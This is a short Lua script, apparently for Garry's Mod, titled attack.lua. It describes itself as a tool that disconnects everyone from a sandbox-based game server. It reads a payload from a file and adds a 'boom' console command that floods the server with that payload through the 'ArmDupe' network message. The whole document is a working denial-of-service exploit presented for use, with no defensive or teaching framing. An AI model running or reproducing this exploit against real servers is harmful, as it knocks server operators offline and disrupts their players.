-- J Gonzalez
-- June 30, 2018
-- attack.lua
-- Licensed under the terms of the AGPLv3
-- Disconnects everyone from a sandbox based server (including darkrp?)

local f = file.Open('FinalOutput.txt', 'rb', 'DATA'); 
local payload = f:Read(f:Size())
local length = payload:len()

print('Length: ' .. length)
print('Size: ' .. f:Size())

local function crash()
  net.Start('ArmDupe')
  net.WriteUInt(length, 32)
  net.WriteData(payload, length)
  net.SendToServer()
end

concommand.Add('boom', crash)
